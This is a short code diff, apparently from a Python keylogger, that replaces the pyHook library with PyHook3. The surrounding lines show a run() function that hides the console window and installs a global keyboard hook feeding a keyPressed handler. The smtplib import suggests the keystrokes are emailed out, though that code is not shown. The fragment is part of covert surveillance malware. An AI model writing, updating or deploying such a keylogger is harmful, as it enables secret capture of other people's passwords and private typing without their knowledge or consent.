@@ -1,4 +1,4 @@
-import pythoncom, pyHook
+import pythoncom, PyHook3
 import threading
 import smtplib
 import datetime, time
@@ -64,7 +64,7 @@ def hideConsole():
 def run():
     hideConsole()
 
-    obj = pyHook.HookManager()
+    obj = PyHook3.HookManager()
     obj.KeyDown = keyPressed
     obj.HookKeyboard()
     pythoncom.PumpMessages()
